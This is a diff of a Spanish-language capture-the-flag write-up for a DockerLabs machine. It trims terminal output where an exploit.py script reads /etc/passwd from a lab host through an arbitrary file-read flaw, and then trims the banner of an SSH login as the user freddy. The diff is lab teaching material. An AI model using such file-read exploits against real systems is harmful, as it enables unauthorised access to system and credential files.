@@ -155,28 +155,6 @@ Vemos que efectivamente podemos leer fichero de la maquina víctima, por ejemplo
 └─$ python3 exploit.py -H http://172.17.0.2:3000
 Read file > /etc/passwd
 root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
-_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
-systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
-messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
-ftp:x:101:104:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
-sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
 grafana:x:103:105::/usr/share/grafana:/bin/false
 freddy:x:1000:1000::/home/freddy:/bin/bash
 ```
@@ -217,27 +195,7 @@ En el fichero `/etc/passwd` de la maquina victima vimos que el único usuario qu
 ```bash
 ┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Move]
 └─$ ssh freddy@172.17.0.2
-The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
-ED25519 key fingerprint is SHA256:vI77ttzFmsp8NiCsxBpeZipRCZ9MdfkeMJojz7qMiTw.
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
 freddy@172.17.0.2's password: 
-Linux c6b30fd1dfdb 6.16.8+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.16.8-1kali1 (2025-09-24) x86_64
-
-The programs included with the Kali GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-┏━(Message from Kali developers)
-┃
-┃ This is a minimal installation of Kali Linux, you likely
-┃ want to install supplementary tools. Learn how:
-┃ ⇒ https://www.kali.org/docs/troubleshooting/common-minimum-setup/
-┃
-┗━(Run: “touch ~/.hushlogin” to hide this message)
 ┌──(freddy㉿c6b30fd1dfdb)-[~]
 └─$ hostname -I                                                                                                                                                                    
 172.17.0.2 
